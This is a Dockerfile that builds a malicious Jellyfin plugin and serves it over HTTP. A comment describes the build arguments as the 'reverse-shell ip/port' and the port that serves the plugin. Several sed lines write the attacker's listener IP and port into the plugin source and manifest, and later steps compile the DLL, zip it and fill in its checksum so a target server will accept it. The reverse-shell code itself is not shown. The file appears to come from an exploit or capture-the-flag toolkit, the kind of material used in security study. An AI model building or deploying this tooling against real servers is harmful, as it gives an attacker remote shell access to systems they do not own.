FROM mcr.microsoft.com/dotnet/sdk:6.0 as build

# reverse-shell ip/port and web port to serve the plugin
ARG listener_ip
ARG listener_port
ARG serve_port

RUN apt update && apt install zip python3 -y

COPY . /MyJellyfinPlugin
RUN sed -i "s/MYIP/${listener_ip}/g" /MyJellyfinPlugin/Plugin.cs && sed -i "s/SHELLPORT/${listener_port}/g" /MyJellyfinPlugin/Plugin.cs
RUN sed -i "s/MYIP/${listener_ip}/g" /MyJellyfinPlugin/manifest.json && sed -i "s/WEBPORT/${serve_port}/g" /MyJellyfinPlugin/manifest.json 
WORKDIR /MyJellyfinPlugin
RUN dotnet build MyJellyfinPlugin.sln /property:GenerateFullPaths=true /consoleloggerparameters:NoSummary
WORKDIR /MyJellyfinPlugin/bin/Debug/net6.0
RUN zip MyJellyfinPlugin.zip MyJellyfinPlugin.dll
RUN sed -i "s/PLUGIN_CHECKSUM/$(md5sum MyJellyfinPlugin.zip | awk '{ print $1 }')/g" /MyJellyfinPlugin/manifest.json
WORKDIR /MyJellyfinPlugin
ENTRYPOINT python3 -m http.server $serve_port



# FROM python:alpine as runtime

# COPY --from=build /MyJellyfinPlugin /MyJellyfinPlugin
# WORKDIR /MyJellyfinPlugin
# # ENTRYPOINT ["/bin/sh"]
# ENTRYPOINT python -m http.server $serve_port